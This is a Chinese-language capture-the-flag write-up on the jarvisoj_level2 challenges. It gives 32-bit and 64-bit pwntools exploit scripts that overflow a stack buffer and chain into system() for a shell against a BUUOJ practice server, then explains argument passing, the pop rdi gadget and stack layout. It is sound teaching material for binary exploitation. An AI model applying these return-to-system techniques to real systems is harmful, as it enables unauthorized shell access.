总结涉及两道题:jarvisoj_level2以及 jarvisoj_level2_x64
为同一知识点的32位和64位形式,均为栈溢出并跳转到`system()`函数执行`bin/bash`

32位exp代码:
```python
from pwn import *

r = remote("node5.buuoj.cn",25666)

offset = 136 +4

payload = b'a'*offset

bin_bash_addr = 0x804a024

sys_addr = 0x8048320

payload += p32(sys_addr) + p32(0xdeadbeef) + p32(bin_bash_addr)

r.sendlineafter("Input:",payload)

r.interactive()
```
64位exp代码:
```python
from pwn import *

r = remote("node5.buuoj.cn",25442)

offset = 128 + 8

bin_bash = 0x600A90

sys_addr = 0x4004C0

pop_rdi_ret = 0x4006b3

payload =  b'a'*offset  +p64(pop_rdi_ret)+ p64(bin_bash) + p64(sys_addr)

r.sendline(payload)

r.interactive()
```

总结:
32位程序call system可以直接在栈上取参数,对应的ROP:
```python
payload += p32(system_addr)    # ret → system()
payload += p32(ret_addr)       # 返回地址（随意填）
payload += p32(bin_bash_addr)  # system() 的第一个参数
```
64位程序则需要通过寄存器`rdi`取参数,对应的ROP:
```python
payload += p64(pop_rdi)       # 控制 RDI
payload += p64(bin_bash)      # RDI = "/bin/sh"
payload += p64(sys_addr)      # 跳 system()
```


另外:
payload 写入的顺序 = 栈上的顺序（从低地址到高地址）
**程序执行 ret 时，从“栈顶”（最低地址部分）依次取 ROP 链的内容。**


栈布局如下
```
高地址(栈底)
sys_addr
bin_bash addr
pop_rdi_ret addr
saved rbp    --paddings
buffer       --paddings
低地址(栈顶)
```

main函数`ret`后即将`pop_rdi_ret addr`从栈顶取出存入寄存器`rip`,接着程序执行流跳到`pop rdi;ret`,接下来将`/bin/bash`字符串从栈顶取出放入`rdi`寄存器,再次执行`ret`即`pop rip`将`system`的地址存入`rip`,程序将开始执行`system`.



对于32位程序则其函数直接从栈上取参数,无需找`pop rdi`.
32位程序的标准调用堆栈：
```markdown
[ 上地址 ]
-----------------
| return address |   <-- ebp + 4
-----------------
| saved EBP      |   <-- ebp
-----------------
| local vars     |
| ...            |
| s (ebp - 0x26) |
-----------------
[ 下地址 ]

```
本质我们要覆盖的是EBP/RBP，偏移量的寻找也是根据读入的变量计算其相对rbp的偏移
如果只有一个定长数组（例如char buf[32]），变量布局非常简单，所以覆盖数组长度 + 8 就到 saved rbp。  
如果函数里有多个不同类型的局部变量，特别是 short、int、指针混合出现，编译器会插入 padding 做对齐，所以偏移不再是整齐的数字。要灵活运用。